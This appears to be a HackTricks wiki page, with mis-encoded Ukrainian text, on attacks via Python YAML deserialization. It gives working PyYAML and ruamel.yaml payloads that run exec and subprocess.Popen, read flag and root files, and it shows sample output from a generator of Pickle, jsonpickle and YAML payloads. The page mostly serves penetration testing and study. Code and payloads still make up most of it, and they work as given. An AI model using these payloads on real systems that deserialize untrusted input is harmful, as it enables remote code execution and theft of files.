<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é –≤ —Ä–µ–∫–ª–∞–º—ñ –Ω–∞ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) —Ç–∞ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ GitHub.

</details>


# Yaml **–î–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è**

–ë—ñ–±–ª—ñ–æ—Ç–µ–∫–∏ **Yaml** –¥–ª—è python —Ç–∞–∫–æ–∂ –º–æ–∂—É—Ç—å **—Å–µ—Ä—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –æ–±'—î–∫—Ç–∏ python**, –∞ –Ω–µ –ª–∏—à–µ —Å–∏—Ä—É ‚Äã‚Äã—ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—é:
```
print(yaml.dump(str("lol")))
lol
...

print(yaml.dump(tuple("lol")))
!!python/tuple
- l
- o
- l

print(yaml.dump(range(1,10)))
!!python/object/apply:builtins.range
- 1
- 10
- 1
```
–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ, —è–∫ **–∫–æ—Ä—Ç–µ–∂** –Ω–µ —î —Å–∏—Ä–æ–≤–∏–º —Ç–∏–ø–æ–º –¥–∞–Ω–∏—Ö, —Ç–æ–º—É –≤—ñ–Ω –±—É–≤ **—Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π**. –¢–µ –∂ —Å–∞–º–µ —Å—Ç–∞–ª–æ—Å—è –∑ **–¥—ñ–∞–ø–∞–∑–æ–Ω–æ–º** (–≤–∑—è—Ç–æ –∑ –≤–±—É–¥–æ–≤–∞–Ω–∏—Ö).

![](<../../.gitbook/assets/image (628) (1).png>)

**safe\_load()** –∞–±–æ **safe\_load\_all()** –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î SafeLoader —ñ **–Ω–µ –ø—ñ–¥—Ç—Ä–∏–º—É—î –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—é –æ–±'—î–∫—Ç—ñ–≤ –∫–ª–∞—Å—É**. –ü—Ä–∏–∫–ª–∞–¥ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó –æ–±'—î–∫—Ç—ñ–≤ –∫–ª–∞—Å—É:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:builtins.range [1, 10, 1]'

print(yaml.load(data, Loader=UnsafeLoader)) #range(1, 10)
print(yaml.load(data, Loader=Loader)) #range(1, 10)
print(yaml.load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=Loader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=UnsafeLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.load_all(data, Loader=FullLoader)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load(data)) #range(1, 10)
print(yaml.full_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>
print(yaml.unsafe_load_all(data)) #<generator object load_all at 0x7fc4c6d8f040>

#The other ways to load data will through an error as they won't even attempt to
#deserialize the python object
```
–ü–æ–ø–µ—Ä–µ–¥–Ω—ñ–π –∫–æ–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞–≤ **unsafe\_load**, —â–æ–± –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –∫–ª–∞—Å Python. –¶–µ —Ç–æ–º—É, —â–æ –≤ **–≤–µ—Ä—Å—ñ—ó >= 5.1** –≤—ñ–Ω –Ω–µ –¥–æ–∑–≤–æ–ª—è—î **–¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É–≤–∞—Ç–∏ –±—É–¥—å-—è–∫–∏–π —Å–µ—Ä—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–∏–π –∫–ª–∞—Å Python –∞–±–æ –∞—Ç—Ä–∏–±—É—Ç –∫–ª–∞—Å—É**, —è–∫—â–æ –≤ load() –Ω–µ –≤–∫–∞–∑–∞–Ω–æ Loader –∞–±–æ Loader=SafeLoader.

## –ë–∞–∑–æ–≤–∞ –∞—Ç–∞–∫–∞

–ü—Ä–∏–∫–ª–∞–¥ —Ç–æ–≥–æ, —è–∫ **–≤–∏–∫–æ–Ω–∞—Ç–∏ –∑–∞—Ç—Ä–∏–º–∫—É**:
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
data = b'!!python/object/apply:time.sleep [2]'
print(yaml.load(data, Loader=UnsafeLoader)) #Executed
print(yaml.load(data, Loader=Loader)) #Executed
print(yaml.load_all(data))
print(yaml.load_all(data, Loader=Loader))
print(yaml.load_all(data, Loader=UnsafeLoader))
print(yaml.load_all(data, Loader=FullLoader))
print(yaml.unsafe_load(data)) #Executed
print(yaml.full_load_all(data))
print(yaml.unsafe_load_all(data))
```
## –í—Ä–∞–∑–ª–∏–≤–∏–π .load("\<content>") –±–µ–∑ Loader

**–°—Ç–∞—Ä—ñ –≤–µ—Ä—Å—ñ—ó** pyyaml –±—É–ª–∏ –≤—Ä–∞–∑–ª–∏–≤—ñ –¥–æ –∞—Ç–∞–∫ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ—ó, —è–∫—â–æ –≤–∏ **–Ω–µ –≤–∫–∞–∑–∞–ª–∏ Loader** –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ —á–æ–≥–æ—Å—å: `yaml.load(data)`

–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ [**–æ–ø–∏—Å –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ —Ç—É—Ç**](https://hackmd.io/@defund/HJZajCVlP)**.** –ó–∞–ø—Ä–æ–ø–æ–Ω–æ–≤–∞–Ω–∏–π **–µ–∫—Å–ø–ª–æ–π—Ç** –Ω–∞ —Ç—ñ–π —Å—Ç–æ—Ä—ñ–Ω—Ü—ñ:
```yaml
!!python/object/new:str
state: !!python/tuple
- 'print(getattr(open("flag\x2etxt"), "read")())'
- !!python/object/new:Warning
state:
update: !!python/name:exec
```
–ê–±–æ –≤–∏ —Ç–∞–∫–æ–∂ –º–æ–∂–µ—Ç–µ —Å–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏—Å—è —Ü–∏–º **–æ–¥–Ω–æ—Ä—è–¥–∫–æ–≤–∏–º –∫–æ–¥–æ–º, –Ω–∞–¥–∞–Ω–∏–º @ishaack**:
```yaml
!!python/object/new:str {state: !!python/tuple ['print(exec("print(o"+"pen(\"flag.txt\",\"r\").read())"))', !!python/object/new:Warning {state : {update : !!python/name:exec } }]}
```
–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —â–æ –≤ **–æ—Å—Ç–∞–Ω–Ω—ñ—Ö –≤–µ—Ä—Å—ñ—è—Ö** –≤–∏ –Ω–µ –º–æ–∂–µ—Ç–µ **–±—ñ–ª—å—à–µ –≤–∏–∫–ª–∏–∫–∞—Ç–∏ `.load()`** **–±–µ–∑ `Loader`**, —ñ **`FullLoader`** –≤–∂–µ **–Ω–µ —î –≤—Ä–∞–∑–ª–∏–≤–∏–º** –¥–æ —Ü—å–æ–≥–æ –≤–∏–¥—É –∞—Ç–∞–∫–∏.

# RCE

–í–ª–∞—Å–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –º–æ–∂–Ω–∞ —Å—Ç–≤–æ—Ä—é–≤–∞—Ç–∏ –∑–∞ –¥–æ–ø–æ–º–æ–≥–æ—é –º–æ–¥—É–ª—ñ–≤ Python YAML, —Ç–∞–∫–∏—Ö —è–∫ **PyYAML** –∞–±–æ **ruamel.yaml**. –¶—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –º–æ–∂—É—Ç—å –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –≤ —Å–∏—Å—Ç–µ–º–∞—Ö, —è–∫—ñ –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑—É—é—Ç—å –Ω–µ–Ω–∞–¥—ñ–π–Ω–∏–π –≤–≤—ñ–¥ –±–µ–∑ –Ω–∞–ª–µ–∂–Ω–æ—ó —Å–∞–Ω—ñ—Ç–∞—Ä—ñ—ó–∑–∞—Ü—ñ—ó.
```python
import yaml
from yaml import UnsafeLoader, FullLoader, Loader
import subprocess

class Payload(object):
def __reduce__(self):
return (subprocess.Popen,('ls',))

deserialized_data = yaml.dump(Payload()) # serializing data
print(deserialized_data)

#!!python/object/apply:subprocess.Popen
#- ls

print(yaml.load(deserialized_data, Loader=UnsafeLoader))
print(yaml.load(deserialized_data, Loader=Loader))
print(yaml.unsafe_load(deserialized_data))
```
## –Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç –¥–ª—è —Å—Ç–≤–æ—Ä–µ–Ω–Ω—è Payloads

–Ü–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç [https://github.com/j0lt-github/python-deserialization-attack-payload-generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator) –º–æ–∂–µ –±—É—Ç–∏ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–∏–π –¥–ª—è –≥–µ–Ω–µ—Ä–∞—Ü—ñ—ó python –¥–µ—Å–µ—Ä—ñ–∞–ª—ñ–∑–∞—Ü—ñ–π–Ω–∏—Ö payloads –¥–ª—è –∑–ª–æ–≤–∂–∏–≤–∞–Ω–Ω—è **Pickle, PyYAML, jsonpickle —Ç–∞ ruamel.yaml:**
```bash
python3 peas.py
Enter RCE command :cat /root/flag.txt
Enter operating system of target [linux/windows] . Default is linux :linux
Want to base64 encode payload ? [N/y] :
Enter File location and name to save :/tmp/example
Select Module (Pickle, PyYAML, jsonpickle, ruamel.yaml, All) :All
Done Saving file !!!!

cat /tmp/example_jspick
{"py/reduce": [{"py/type": "subprocess.Popen"}, {"py/tuple": [{"py/tuple": ["cat", "/root/flag.txt"]}]}]}

cat /tmp/example_pick | base64 -w0
gASVNQAAAAAAAACMCnN1YnByb2Nlc3OUjAVQb3BlbpSTlIwDY2F0lIwOL3Jvb3QvZmxhZy50eHSUhpSFlFKULg==

cat /tmp/example_yaml
!!python/object/apply:subprocess.Popen
- !!python/tuple
- cat
- /root/flag.txt
```
## –ü–æ—Å–∏–ª–∞–Ω–Ω—è

* [https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf](https://www.exploit-db.com/docs/english/47655-yaml-deserialization-attack-in-python.pdf)
* [https://net-square.com/yaml-deserialization-attack-in-python.html](https://net-square.com/yaml-deserialization-attack-in-python.html)


<details>

<summary><strong>–í–∏–≤—á–∞–π—Ç–µ —Ö–∞–∫—ñ–Ω–≥ AWS –≤—ñ–¥ –Ω—É–ª—è –¥–æ –≥–µ—Ä–æ—è –∑</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

–Ü–Ω—à—ñ —Å–ø–æ—Å–æ–±–∏ –ø—ñ–¥—Ç—Ä–∏–º–∫–∏ HackTricks:

* –Ø–∫—â–æ –≤–∏ —Ö–æ—á–µ—Ç–µ –ø–æ–±–∞—á–∏—Ç–∏ –≤–∞—à—É **–∫–æ–º–ø–∞–Ω—ñ—é —Ä–µ–∫–ª–∞–º–æ–≤–∞–Ω—É –≤ HackTricks** –∞–±–æ **–∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ HackTricks —É —Ñ–æ—Ä–º–∞—Ç—ñ PDF**, –ø–µ—Ä–µ–≤—ñ—Ä—Ç–µ [**–ü–õ–ê–ù–ò –ü–Ü–î–ü–ò–°–ö–ò**](https://github.com/sponsors/carlospolop)!
* –û—Ç—Ä–∏–º–∞–π—Ç–µ [**–æ—Ñ—ñ—Ü—ñ–π–Ω–∏–π PEASS & HackTricks –º–µ—Ä—á**](https://peass.creator-spring.com)
* –í—ñ–¥–∫—Ä–∏–π—Ç–µ –¥–ª—è —Å–µ–±–µ [**–°—ñ–º'—é PEASS**](https://opensea.io/collection/the-peass-family), –Ω–∞—à—É –∫–æ–ª–µ–∫—Ü—ñ—é –µ–∫—Å–∫–ª—é–∑–∏–≤–Ω–∏—Ö [**NFT**](https://opensea.io/collection/the-peass-family)
* **–ü—Ä–∏—î–¥–Ω—É–π—Ç–µ—Å—å –¥–æ** üí¨ [**–≥—Ä—É–ø–∏ Discord**](https://discord.gg/hRep4RUj7f) –∞–±–æ [**–≥—Ä—É–ø–∏ Telegram**](https://t.me/peass) –∞–±–æ **—Å–ª—ñ–¥–∫—É–π—Ç–µ** –∑–∞ –Ω–∞–º–∏ –Ω–∞ **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **–ü–æ–¥—ñ–ª—ñ—Ç—å—Å—è —Å–≤–æ—ó–º–∏ —Ö–∞–∫–µ—Ä—Å—å–∫–∏–º–∏ —Ç—Ä—é–∫–∞–º–∏, –Ω–∞–¥—Å–∏–ª–∞–π—Ç–µ PR –¥–æ** [**HackTricks**](https://github.com/carlospolop/hacktricks) **—ñ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä—ñ—ó–≤ –Ω–∞ GitHub**.

</details>
